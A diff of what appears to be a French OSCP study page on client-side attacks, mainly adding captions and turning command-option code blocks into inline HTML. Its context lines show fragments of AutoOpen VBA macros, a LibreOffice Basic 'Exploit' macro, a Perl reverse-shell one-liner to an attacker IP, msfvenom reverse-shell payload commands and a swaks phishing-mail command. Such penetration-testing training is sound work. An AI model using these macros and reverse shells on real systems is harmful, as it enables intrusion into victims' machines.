@@ -29,6 +29,8 @@ End Sub
 ```
 
 
+<p class="oscp-command-note">Macro VBA déclenchée à l'ouverture du document</p>
+
 ```text
 Sub AutoOpen()
     MyMacro
@@ -79,6 +81,8 @@ for i in range(0, len(cmd_str), chunk_size):
 
 
 
+
+<p class="oscp-command-note">Macro VBA déclenchée à l'ouverture du document</p>
 
 ```text
 Sub AutoOpen()
@@ -179,6 +183,8 @@ End Sub
 ```
 
 
+<p class="oscp-command-note">Macro VBA déclenchée à l'ouverture du document</p>
+
 ```text
 Sub AutoOpen()
     MyMacro
@@ -273,10 +279,7 @@ sudo swaks -t <recipient@example.com> --from <sender@example.com> \
 
 
 
-```text
---auth LOGIN
-
-```
+<p class="oscp-inline-ref"><strong>Option de commande :</strong> <code>--auth LOGIN</code></p>
 
 
 **Paramètres et repères :**
@@ -375,18 +378,12 @@ echo 'use Socket;$i="<your_ip>";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyn
 
 
 
-```text
--f elf
-
-```
+<p class="oscp-inline-ref"><strong>Option de commande :</strong> <code>-f elf</code></p>
 
 
 
 
-```text
--o shell.elf
-
-```
+<p class="oscp-inline-ref"><strong>Option de commande :</strong> <code>-o shell.elf</code></p>
 
 
 **Paramètres et repères :**
@@ -394,6 +391,8 @@ echo 'use Socket;$i="<your_ip>";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyn
 
 
 
+
+<p class="oscp-command-note">Procédure VBA d'exécution</p>
 
 ```text
 Sub RunShell
@@ -464,18 +463,12 @@ msfvenom -p windows/shell_reverse_tcp LHOST=<attacker-ip> LPORT=<port> -f hta-ps
 
 
 
-```text
--f hta-psh
-
-```
+<p class="oscp-inline-ref"><strong>Option de commande :</strong> <code>-f hta-psh</code></p>
 
 
 
 
-```text
--o evil.hta
-
-```
+<p class="oscp-inline-ref"><strong>Option de commande :</strong> <code>-o evil.hta</code></p>
 
 
 **Paramètres et repères :**
@@ -485,10 +478,7 @@ msfvenom -p windows/shell_reverse_tcp LHOST=<attacker-ip> LPORT=<port> -f hta-ps
 
 
 
-```text
--f exe -o evil.exe
-
-```
+<p class="oscp-inline-ref"><strong>Option de commande :</strong> <code>-f exe -o evil.exe</code></p>
 
 
 **Paramètres et repères :**
@@ -497,10 +487,7 @@ msfvenom -p windows/shell_reverse_tcp LHOST=<attacker-ip> LPORT=<port> -f hta-ps
 
 
 
-```text
--f vbs -o evil.vbs
-
-```
+<p class="oscp-inline-ref"><strong>Option de commande :</strong> <code>-f vbs -o evil.vbs</code></p>
 
 
 **Paramètres et repères :**
@@ -509,10 +496,7 @@ msfvenom -p windows/shell_reverse_tcp LHOST=<attacker-ip> LPORT=<port> -f hta-ps
 
 
 
-```text
--f ps1 -o script.ps1
-
-```
+<p class="oscp-inline-ref"><strong>Option de commande :</strong> <code>-f ps1 -o script.ps1</code></p>
 
 
 **Paramètres et repères :**
@@ -521,10 +505,7 @@ msfvenom -p windows/shell_reverse_tcp LHOST=<attacker-ip> LPORT=<port> -f hta-ps
 
 
 
-```text
--f dll -o payload.dll
-
-```
+<p class="oscp-inline-ref"><strong>Option de commande :</strong> <code>-f dll -o payload.dll</code></p>
 
 
 **Paramètres et repères :**
@@ -584,6 +565,8 @@ LibreOffice Basic
 
 
 
+<p class="oscp-command-note">Extrait de macro LibreOffice Basic</p>
+
 ```text
 REM ***** BASIC *****
 Sub Exploit
@@ -601,10 +584,7 @@ End Sub
 
 
 
-```text
-<INSERT_YOUR_PAYLOAD_CHUNKS>
-
-```
+<p class="oscp-inline-ref"><strong>Paramètre à remplacer :</strong> <code>&lt;INSERT_YOUR_PAYLOAD_CHUNKS&gt;</code></p>
 
 
 **Paramètres et repères :**
